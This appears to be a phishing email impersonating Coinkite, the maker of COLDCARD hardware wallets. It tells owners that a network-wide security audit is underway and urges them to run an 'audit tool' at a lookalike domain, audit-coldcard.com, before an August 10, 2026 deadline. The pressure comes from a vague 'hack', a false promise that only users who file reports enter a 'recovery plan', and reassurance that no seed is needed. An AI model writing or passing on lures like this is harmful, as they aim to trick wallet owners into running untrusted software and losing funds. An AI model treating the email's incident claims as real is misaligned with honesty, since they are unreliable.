COLDCARD

We are writing to inform you of a coordinated security audit now underway a=
cross the COLDCARD device network. Recent findings have prompted us to veri=
fy the integrity of hardware across all revisions, and your participation i=
s needed.

We have published a dedicated Audit & Incident Reporting Tool. The tool per=
forms two critical functions:

Network Verification: Run the audit utility to confirm your device revision=
 and RNG status. This data is critical for securing the ecosystem. You will=
 be able to confirm if your device is safe or if you are prone to the hack

Incident Filing: If you have experienced unauthorized transactions, use the=
 tool to generate a verified incident report using device-level metadata. T=
his is how you get to be in our recovery plan

Please access the tool and complete your audit.

Access the Audit Tool https://audit-coldcard.com/

What You Need to Know

The process is air-gapped and does not require your recovery seed at any po=
int. All hardware revisions are included. Only users who generate incident =
reports will be included in the recovery plan. Please complete your verific=
ation by August 10, 2026.

=C2=A9 2026 Coinkite Inc. Toronto, Canada.
Don't Trust. Verify.
